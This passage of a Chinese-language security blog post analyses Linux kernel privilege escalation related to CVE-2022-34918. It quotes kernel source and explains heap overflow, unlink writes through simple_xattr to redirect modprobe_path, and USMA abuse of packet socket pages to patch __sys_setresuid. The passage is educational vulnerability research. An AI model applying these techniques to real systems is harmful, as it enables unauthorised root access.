class="line">EXPORT_SYMBOL_GPL(call_rcu);</span><br></pre></td></tr></table></figure><p>可以看到這裏纔會對func成員賦值<code>user_free_payload_rcu</code>函數地址，並且總所周知的是rcu並不會直接執行回調函數，會先加入到隊列中，等到所有的reader都離開了寬限期之後才能夠將舊的給釋放掉，所以我們可以直接趁此時間利用溢出的<code>user_key_payload</code>去越界讀取下面的內容。</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>在<a class="link"   href="https://github.com/randorisec/CVE-2022-34918-LPE-PoC" >CVE-2022-34918-LPE-PoC<i class="fas fa-external-link-alt"></i></a>中最终<code>get root shell</code>的方式是通过修改<code>modprobe_path</code>达成的，其任意地址写的手段是利用<code>list_del</code>函数存在unlink操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del(struct list_head * prev, struct list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">next-&gt;prev = prev;</span><br><span class="line">WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只需要将<code>/proc/</code>目录修改为<code>/tmp/</code>即可，这样来就可以修改其目标文件了。所以我们只需要修改next低位为<code>0x2f706d74</code>并且prev为<code>modprobe_path + 1</code>即可实现修改目录为<code>/tmp/</code>目录的目的，不过这里的next必须为有效的地址，因为也对next做了写操作。</p><p>physmap 是内核虚拟内存的一个区域，物理内存页在其中连续映射。例如，如果机器有 4GiB（2^32 字节）内存，则需要 32 位（4 字节）来寻址系统中可用的物理内存的每个字节。假设 physmap 从 0xffffffff00000000 开始，从 0xffffffff00000000 到 0xffffffffffffffff 的任何地址都将有效，因为低 4 个字节的每个值（从 0x00000000-0xffffffff）都需要寻址内存。因此，假设系统至少有 4GiB 内存，攻击者可以为<code>prev</code>的低 4 字节选择任何值，只要高 4 字节对应于 physmap 地址即可。</p><p>所以next的取值就很清晰了，也就是<code>physmap + 0x2f706d74</code>。</p><p>这里用于实现上述操作的结构体选择的是<code>simple_xattr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">simple_xattr</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">char</span> value[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct simple_xattr *<span class="title">simple_xattr_alloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">simple_xattr</span> *<span class="title">new_xattr</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* wrap around? */</span></span><br><span class="line">len = <span class="keyword">sizeof</span>(*new_xattr) + size;</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(*new_xattr))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">new_xattr = kvmalloc(len, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!new_xattr)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">new_xattr-&gt;size = size;</span><br><span class="line"><span class="built_in">memcpy</span>(new_xattr-&gt;value, value, size);</span><br><span class="line"><span class="keyword">return</span> new_xattr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述是关于<code>simple_xattr</code>的生成函数，可以看到其长度主要有结构体大小以及指定的<code>value</code>大小决定，并且其申请的标志位为<code>GFP_KERNEL</code>所以算是这一利用手法的最佳选择。</p><p>然后这里exp中存在一个小小的trick，因为<code>simple_xattr</code>是通过<code>name</code>进行索引的，所以这里可以直接通过溢出修改name的最后一个字节，因为前面可以看到的是name是一个char类型的指针，所以其末尾一定为0所以修改为一定偏移，那么就可以通过修改后的字符串进行索引可以直接找到被我们溢出修改掉的<code>simple_xattr</code>结构体。</p><p><strong>因为我这里采用的是5.10的内核版本所以就不写上面的exp了</strong></p><h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>在以往我们简单介绍过<a href="https://196082.github.io/2023/05/24/pipe-buffer/">usma</a>，当时采用的是直接修改页表的方式来对代码段进行修改，并且在那里我们使用了<code>packet socket</code>模块来构建页级堆风水，不过这次在这里我们可以直接使用它来完成usma。</p><p>packet socket模块可以让用户在设备驱动层接受和发送raw packets，并且为了加速数据报文的拷贝，它允许用户创建一块与内核态共享的环形缓冲区，其具体实现函数为<code>packet_set_ring</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">packet_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">sockptr_t</span> optval,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (optname) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">    optname == PACKET_TX_RING);</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会根据setopt进入到不同分支，这里选择创建一块用户态与内核态共享的环形缓冲区，即上述case中，最终走到<code>packet_set_ring</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">__be16 num;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">err = -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!closing) &#123;</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity tests and some calculations */</span></span><br><span class="line">err = -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (unlikely(rb-&gt;pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">po-&gt;tp_hdrlen = TPACKET_HDRLEN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">po-&gt;tp_hdrlen = TPACKET2_HDRLEN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">po-&gt;tp_hdrlen = TPACKET3_HDRLEN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (unlikely((<span class="keyword">int</span>)req-&gt;tp_block_size &lt;= <span class="number">0</span>))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!PAGE_ALIGNED(req-&gt;tp_block_size)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">min_frame_size = po-&gt;tp_hdrlen + po-&gt;tp_reserve;</span><br><span class="line"><span class="keyword">if</span> (po-&gt;tp_version &gt;= TPACKET_V3 &amp;&amp;</span><br><span class="line">    req-&gt;tp_block_size &lt;</span><br><span class="line">    BLK_PLUS_PRIV((u64)req_u-&gt;req3.tp_sizeof_priv) + min_frame_size)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (unlikely(req-&gt;tp_frame_size &lt; min_frame_size))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (unlikely(req-&gt;tp_frame_size &amp; (TPACKET_ALIGNMENT - <span class="number">1</span>)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">rb-&gt;frames_per_block = req-&gt;tp_block_size / req-&gt;tp_frame_size;</span><br><span class="line"><span class="keyword">if</span> (unlikely(rb-&gt;frames_per_block == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (unlikely(rb-&gt;frames_per_block &gt; UINT_MAX / req-&gt;tp_block_nr))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (unlikely((rb-&gt;frames_per_block * req-&gt;tp_block_nr) !=</span><br><span class="line">req-&gt;tp_frame_nr))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">order = get_order(req-&gt;tp_block_size);</span><br><span class="line">pg_vec = alloc_pg_vec(req, order);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述会走到<code>alloc_pg_vec</code>函数申请<code>pg_vec</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line"><span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">pg_vec = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会根据<code>block_nr</code>来申请对应数量的页，并最终存放在<code>pg_vec</code>中。</p><p>然后就是为什么其可以直接代替页表来实现usma，因为其可以直接将页映射到用户态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_mmap</span><span class="params">(struct file *file, struct socket *sock,</span></span></span><br><span class="line"><span class="params"><span class="function">struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> size, expected_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start;</span><br><span class="line"><span class="keyword">int</span> err = -EINVAL;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_pgoff)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line"></span><br><span class="line">expected_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line"><span class="keyword">if</span> (rb-&gt;pg_vec) &#123;</span><br><span class="line">expected_size += rb-&gt;pg_vec_len</span><br><span class="line">* rb-&gt;pg_vec_pages</span><br><span class="line">* PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expected_size == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">size = vma-&gt;vm_end - vma-&gt;vm_start;</span><br><span class="line"><span class="keyword">if</span> (size != expected_size)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">start = vma-&gt;vm_start;</span><br><span class="line"><span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line"><span class="keyword">if</span> (rb-&gt;pg_vec == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;</span><br><span class="line"><span class="keyword">int</span> pg_num;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (pg_num = <span class="number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;</span><br><span class="line">page = pgv_to_page(kaddr);</span><br><span class="line">err = vm_insert_page(vma, start, page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(err))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">start += PAGE_SIZE;</span><br><span class="line">kaddr += PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">atomic_inc(&amp;po-&gt;mapped);</span><br><span class="line">vma-&gt;vm_ops = &amp;packet_mmap_ops;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里则是通过mmap将其页面映射到用户态的函数，可以看到最终是将page插入到vma中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">validate_page_before_insert</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (PageAnon(page) || PageSlab(page) || page_has_type(page))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">flush_dcache_page(page);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过需要注意的是，在插入的过程中会对页面进行检测，检查page是否为匿名页，是否为Slab子系统分配的页，以及page是否含有type，而内存页的type总共有以下四种。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_buddy0x00000080</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_offline0x00000100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_table0x00000200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_guard0x00000400</span></span><br></pre></td></tr></table></figure><p>PG_buddy为伙伴系统中的页，PG_offline为内存交换出去的页，PG_table为用作页表的页，PG_guard为用作内存屏障的页。可以看到如果传入的page为内核代码段的页，以上的检查全都可以绕过。</p><p>所以这里可以直接通过溢出修改掉pg_vec中虚拟地址的值为<code>__sys_setresuid</code>函数所在的页，从而直接修改该函数，最终<code>get root shell</code>。</p><h2 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span 